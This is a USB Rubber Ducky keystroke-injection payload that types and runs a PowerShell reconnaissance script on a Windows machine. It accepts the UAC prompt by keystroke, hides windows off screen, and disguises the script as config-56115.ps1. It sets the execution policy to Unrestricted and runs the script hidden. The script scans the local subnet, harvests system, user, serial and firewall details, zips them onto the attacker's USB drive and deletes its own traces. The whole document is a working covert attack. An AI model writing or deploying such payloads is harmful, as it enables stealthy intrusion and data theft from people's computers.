DELAY 3000
GUI r
DELAY 1000
STRING powershell Start-Process notepad -Verb runAs
ENTER
DELAY 3000
ALT y
DELAY 3000
ENTER
ALT SPACE
DELAY 1000
STRING m
DELAY 1000
DOWNARROW
REPEAT 100
ENTER
STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss')
ENTER
STRING $userDir = (Get-ChildItem env:\userprofile).value + '\Ducky Report ' + $folderDateTime
ENTER
STRING $fileSaveDir = New-Item  ($userDir) -ItemType Directory 
ENTER
STRING $date = get-date 
ENTER
STRING $style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
ENTER
STRING $Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html' 
ENTER
STRING $Report = $Report + "<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>" 
ENTER
STRING $IP = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter 'IPEnabled = True' | Select IPAddress -First 1
ENTER
STRING $IPAddr = $IP.IPAddress | Select-Object -Index 0 
ENTER 
STRING $IPAddr -as [String] 
ENTER
STRING $IPa = $IPAddr.Split('.') | Select -Index 0 
ENTER
STRING $IPb = $IPAddr.Split('.') | Select -Index 1 
ENTER 
STRING $IPc = $IPAddr.Split('.') | Select -Index 2 
ENTER
STRING $IPAddr = $IPa + '.' + $IPb + '.' + $IPc + '.' 
ENTER 
STRING $Ping = new-object System.Net.Networkinformation.Ping 
ENTER
STRING $ScanResults = .. | ForEach-Object {($Ping).Send($IpAddr + $_) } | Where-Object {$_.Status -eq 'Success'} | select Address 
ENTER
STRING $x = 0 
ENTER 
STRING $Report = $Report  + '<div id=center><h3>Network Scan Results</h3><table>' 
ENTER
STRING do { 
ENTER 
STRING $IPResults = $ScanResults |  Select-Object -Index $x 
ENTER
STRING $CompInfo = Get-WmiObject Win32_OperatingSystem -Computer $IPResults.Address | Select RegisteredUser, SystemDirectory  
ENTER
STRING $CompName = (Get-WmiObject Win32_OperatingSystem -Computer $IPResults.Address).csname 
ENTER
STRING $CurrIP = $IPResults.Address.IPAddressToString 
ENTER 
STRING $CurrOS = $CompInfo.SystemDirectory 
ENTER
STRING $CurrName = $CompInfo.RegisteredUser 
ENTER 
STRING if ($CompInfo -ne $null){ 
ENTER 
STRING $Report = $Report  + '<tr><td><b>IP Address:</b></td><td>' + $CurrIP + '</td><td><b>Compter Name: </b></td><td>' + $CompName + '</td><td><b>User Name: </b></td><td>' + $CurrName + '</td> <td><b>OS:</b> </td><td>' + $CurrOS + '</td></tr><br>' 
ENTER 
STRING }else{ 
ENTER
STRING $Report = $Report  + '<tr><td><b>IP Address: </b></td><td>' + $CurrIP + '</td><td><b>Computer Name: </b></td><td>NOT KNOWN</td><td><b>User Name: </b></td><td>NOT KNOWN</td><td><b>OS:</b></td><td>NOT KNOWN</td></tr><br>'} 
ENTER 
STRING $x ++ 
ENTER 
STRING } while ($x -lt $ScanResults.Count)
ENTER 
STRING $Report = $Report + '</table></div>' 
ENTER
STRING $SysBootTime = Get-WmiObject Win32_OperatingSystem  
ENTER 
STRING $BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetime  
ENTER 
STRING $SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)  
ENTER 
STRING $SerialNo = $SysSerialNo.SerialNumber  
ENTER 
STRING $SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model  
ENTER 
STRING $SysManufacturer = $SysInfo.Manufacturer  
ENTER 
STRING $SysModel = $SysInfo.Model
ENTER 
STRING $OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).caption 
ENTER 
STRING $disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
ENTER
STRING $HD = [math]::truncate($disk.Size / 1GB) 
ENTER
STRING $FreeSpace = [math]::truncate($disk.FreeSpace / 1GB) 
ENTER
STRING $SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select  TotalVisibleMemorySize 
ENTER 
STRING $Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB) 
ENTER 
STRING $SysCpu = Get-WmiObject Win32_Processor | Select Name 
ENTER 
STRING $Cpu = $SysCpu.Name 
ENTER  
STRING $HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumber 
ENTER 
STRING $HardSerialNo = $HardSerial.SerialNumber 
ENTER  
STRING $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select Name 
ENTER 
STRING $graphicsCard = gwmi win32_VideoController |select Name 
ENTER
STRING $graphics = $graphicsCard.Name 
ENTER
STRING $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1 
ENTER
STRING $DriveLetter = $CDDrive.Drive 
ENTER 
STRING $DriveName = $CDDrive.Caption 
ENTER
STRING $Disk = $DriveLetter + '\' + $DriveName 
ENTER
STRING $Firewall = New-Object -com HNetCfg.FwMgr  
ENTER 
STRING $FireProfile = $Firewall.LocalPolicy.CurrentProfile  
ENTER
STRING $FireProfile = $FireProfile.FirewallEnabled
ENTER 
STRING $Report = $Report  + "<div id=left><h3>Computer Information</h3><br><table><tr><td>Operating System</td><td>$OS</td></tr><tr><td>OS Serial Number:</td><td>$SerialNo</td></tr><tr><td>Current User:</td><td>$env:USERNAME </td></tr><tr><td>System Uptime:</td><td>$BootTime</td></tr><tr><td>System Manufacturer:</td><td>$SysManufacturer</td></tr><tr><td>System Model:</td><td>$SysModel</td></tr><tr><td>Serial Number:</td><td>$HardSerialNo</td></tr><tr><td>Firewall is Active:</td><td>$FireProfile</td></tr></table></div><div id=right><h3>Hardware Information</h3><table><tr><td>Hardrive Size:</td><td>$HD GB</td></tr><tr><td>Hardrive Free Space:</td><td>$FreeSpace GB</td></tr><tr><td>System RAM:</td><td>$Ram GB</td></tr><tr><td>Processor:</td><td>$Cpu</td></tr><td>CD Drive:</td><td>$Disk</td></tr><tr><td>Graphics Card:</td><td>$graphics</td></tr></table></div>"  
ENTER 
STRING $Report >> $fileSaveDir'/ComputerInfo.html' 
ENTER
STRING function copy-ToZip($fileSaveDir){ 
ENTER 
STRING $srcdir = $fileSaveDir 
ENTER
STRING $zipFile = 'C:\Windows\Report.zip'
ENTER
STRING if(-not (test-path($zipFile))) { 
ENTER
STRING set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
ENTER 
STRING (dir $zipFile).IsReadOnly = $false} 
ENTER
STRING $shellApplication = new-object -com shell.application 
ENTER 
STRING $zipPackage = $shellApplication.NameSpace($zipFile) 
ENTER
STRING $files = Get-ChildItem -Path $srcdir 
ENTER 
STRING foreach($file in $files) { 
ENTER
STRING $zipPackage.CopyHere($file.FullName) 
ENTER 
STRING while($zipPackage.Items().Item($file.name) -eq $null){ 
ENTER
STRING Start-sleep -seconds 1 }}} 
ENTER 
STRING copy-ToZip($fileSaveDir) 
ENTER
STRING $usbPresent = 'False' 
ENTER 
STRING do { 
ENTER
STRING $present = Get-WMIObject Win32_Volume | ? { $_.Label -eq  '}' | Measure
ENTER
STRING if ($present.Count -ge 1){ 
ENTER 
STRING $usbPresent = 'True' }Else { 
ENTER
STRING $usbPresent = 'False'}} 
ENTER 
STRING until ($usbPresent -eq 'True') 
ENTER
STRING $driveLetter = Get-WMIObject Win32_Volume | ? { $_.Label -eq  '}' | select Name
ENTER
STRING move-item c:\Windows\Report.zip $driveLetter.Name
ENTER
STRING remove-item $fileSaveDir -recurse 
ENTER
STRING Remove-Item $MyINvocation.InvocationName 
ENTER
CTRL s
DELAY 3000  
STRING C:\Windows\config-56115.ps1
ENTER
DELAY 1000
ALT F4 
DELAY 1000
GUI r 
DELAY 3000    
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 3000  
ALT y 
DELAY 3000  
STRING mode con:cols=14 lines=1 
ENTER
ALT SPACE 
DELAY 3000  
STRING m 
DELAY 1000
DOWNARROW 
REPEAT 100
ENTER
STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false 
ENTER 
DELAY 3000  
STRING powershell.exe -windowstyle hidden -File C:\Windows\config-56115.ps1
ENTER
